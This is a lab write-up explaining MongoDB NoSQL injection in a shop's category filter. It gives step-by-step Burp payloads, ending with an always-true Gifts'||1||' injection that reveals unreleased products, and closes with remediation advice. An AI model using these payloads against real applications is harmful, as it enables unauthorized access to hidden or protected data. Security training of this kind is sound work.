# 🧪 **Lab-1 Write-Up — NoSQL Injection in Category Filter (MongoDB)**  
*Releasing Unreleased Products via Always-True JavaScript Injection*

---

## 🔹 **One-Line Summary**

Exploiting a MongoDB NoSQL injection in the category filter by injecting JavaScript boolean logic, bypassing the release-status check, and revealing all unreleased products.

---

## 🔹 **What Is This Topic?**

This lab demonstrates **NoSQL Injection** in **MongoDB**, where user input is inserted directly into a JavaScript expression such as:

```
this.category == '<input>'
```

If the application does not sanitize input, attackers can inject:

- `'` to break syntax  
- `&&` / `||` for logic manipulation  
- `1==1` for always-true conditions  
- `%00` to terminate execution  

This allows bypassing filters, revealing hidden data, or even authentication bypass if misused in login queries.

---

## 🔹 **Real-World Scenario**

This vulnerability appears in real production stacks using:

- Node.js + Express  
- MongoDB / Mongoose  
- Search / filter endpoints  
- JSON / category selectors  
- E-commerce sites hiding unreleased items  

Typical risks:

- Viewing unreleased/hidden products  
- Bypassing visibility filters  
- Extracting admin-only products  
- Full auth bypass when injected into login queries  

Developers mistakenly think “NoSQL is injection-proof” — this lab proves it's not.

---

## 🔹 **High-Value Endpoints to Test**

1. **Category / Filter / Search Parameters**  
   `?category=`, `?search=`, `?filter=`

2. **Login / Authentication JSON Bodies**

3. **REST API Endpoints Accepting JSON**

4. **Visibility / Release Filters**  
   Fields like `released`, `visible`, `isPublic`.

---

## 🔹 **Lab Walkthrough (Step-by-Step)**

### **1️⃣ Capture the category request**
Open a category → Intercept in Burp → Send to Repeater.

---

### **2️⃣ Test for syntax injection**
Payload:
```
Gifts'
```

➡ Breaks the query → **Confirms JavaScript expression injection.**

---

### **3️⃣ Restore valid syntax to verify controlled injection**
Payload:
```
Gifts'+'
```

**(URL-encode with Ctrl+U)**  
➡ No error → **Server executes injected JavaScript safely.**

---

### **4️⃣ Test boolean-based NoSQL logic injection**

#### ❌ False condition:
```
Gifts' && 0 && 'x
```
➡ No products → **False condition applied.**

#### ✔ True condition:
```
Gifts' && 1 && 'x
```
➡ Products return → **True condition manipulated backend logic.**

---

### **5️⃣ Inject always-true condition to bypass release filter**

Payload:
```
Gifts'||1||'
```
(Then URL-encode)

Backend becomes:
```
this.category == 'Gifts' || 1
```

➡ Always TRUE → **All products revealed, including unreleased ones.**

---

### **6️⃣ View results in browser**
Right-click response → **Show response in browser**  
➡ Unreleased products visible  
➡ **Lab solved**

---

## 📸 **Evidence**

5️⃣ **Screenshot — Final always-true NoSQL payload (unreleased products revealed)**  
![Unreleased products](../images/nosql-true-condition.png)

---

## 🔹 **Troubleshooting**

| Problem | Reason | Fix |
|--------|--------|-----|
| Syntax error | Broken JS expression | Balance quotes |
| True/false same | Not URL-encoded | Select payload → Ctrl+U |
| App rejects input | JSON parsing | Escape correctly |
| No unreleased items | Wrong category | Re-check spelling |

---

## 🔹 **Remediation (Defense)**

- ❌ Never concatenate user input into MongoDB queries  
- ✔ Use **parameterized** queries / safe builders  
- ✔ Validate input using **JSON schema**  
- ✔ Sanitize `'`, `"`, `&&`, `||`  
- ✔ Disable JavaScript evaluation inside queries  
- ✔ Avoid dynamic property access  
- ✔ Enforce allow-list categories  
- ✔ Don’t return unreleased data even if filters fail  

---
